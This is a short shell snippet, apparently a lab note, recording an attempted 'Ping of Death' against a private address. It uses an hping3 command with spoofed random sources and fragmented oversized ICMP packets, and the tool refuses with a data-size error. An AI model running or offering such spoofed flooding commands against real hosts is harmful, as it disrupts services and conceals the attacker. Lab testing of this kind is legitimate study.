# ICMP Ping of Death (Not Working)
sudo hping3 -1 192.168.100.2 --rand-source -d 65536 -c 2 -f
# "Option error: sorry, data size must be <= 65495"